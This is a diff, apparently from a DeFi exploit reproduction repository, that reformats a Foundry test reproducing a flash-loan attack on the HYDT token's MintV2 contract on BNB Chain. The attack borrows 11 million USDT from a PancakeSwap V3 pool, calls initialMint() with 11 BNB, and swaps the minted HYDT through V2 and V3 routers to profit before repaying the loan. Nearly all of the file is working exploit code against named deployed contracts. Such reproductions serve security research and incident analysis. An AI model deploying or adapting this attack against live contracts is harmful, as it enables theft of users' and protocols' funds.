@@ -18,10 +18,11 @@ contract ContractTest is Test {
     Uni_Router_V3 routerV3 = Uni_Router_V3(0x1b81D678ffb9C0263b24A97847620C99d213eB14);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 HYDT = IERC20(0x9810512Be701801954449408966c630595D0cD51);
-    uint256 borrow_amount ;
+    uint256 borrow_amount;
     address MintV2 = 0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B;
+
     function setUp() external {
-        cheats.createSelectFork("bsc", 42985310);
+        cheats.createSelectFork("bsc", 42_985_310);
         deal(address(USDT), address(this), 0);
         // deal(address(WBNB), address(this), 11 ether);
     }
@@ -29,17 +30,17 @@ contract ContractTest is Test {
     function testExploit() external {
         emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
         borrow_amount = 11_000_000 ether;
-        pool.flash(address(this),borrow_amount,0,"");
+        pool.flash(address(this), borrow_amount, 0, "");
         emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
     }
 
     function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
         console.log("pancakeV3FlashCallback");
         console.log(USDT.balanceOf(address(this)));
-        swap_token_to_token(address(USDT),address(WBNB),USDT.balanceOf(address(this)));
+        swap_token_to_token(address(USDT), address(WBNB), USDT.balanceOf(address(this)));
         WBNB.withdraw(11 ether);
-        (bool success, ) = MintV2.call{value: 11 ether}(abi.encodeWithSignature("initialMint()"));
-        uint256 v3_amount = HYDT.balanceOf(address(this))/2;
+        (bool success,) = MintV2.call{value: 11 ether}(abi.encodeWithSignature("initialMint()"));
+        uint256 v3_amount = HYDT.balanceOf(address(this)) / 2;
         HYDT.approve(address(routerV3), v3_amount);
         Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
             tokenIn: address(HYDT),
@@ -52,24 +53,20 @@ contract ContractTest is Test {
             fee: 500
         });
         routerV3.exactInputSingle(_Params);
-        swap_token_to_token(address(HYDT),address(WBNB),HYDT.balanceOf(address(this))/2);
-        swap_token_to_token(address(HYDT),address(USDT),HYDT.balanceOf(address(this)));
-        swap_token_to_token(address(WBNB),address(USDT),WBNB.balanceOf(address(this)));
-        USDT.transfer(address(pool),borrow_amount+fee0);
+        swap_token_to_token(address(HYDT), address(WBNB), HYDT.balanceOf(address(this)) / 2);
+        swap_token_to_token(address(HYDT), address(USDT), HYDT.balanceOf(address(this)));
+        swap_token_to_token(address(WBNB), address(USDT), WBNB.balanceOf(address(this)));
+        USDT.transfer(address(pool), borrow_amount + fee0);
         console.log(fee0);
     }
-    
-    function swap_token_to_token(address a,address b,uint256 amount) internal {
+
+    function swap_token_to_token(address a, address b, uint256 amount) internal {
         IERC20(a).approve(address(router), amount);
         address[] memory path = new address[](2);
         path[0] = address(a);
         path[1] = address(b);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount, 0, path, address(this), block.timestamp
-        );
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
     }
 
     receive() external payable {}
-
 }
-
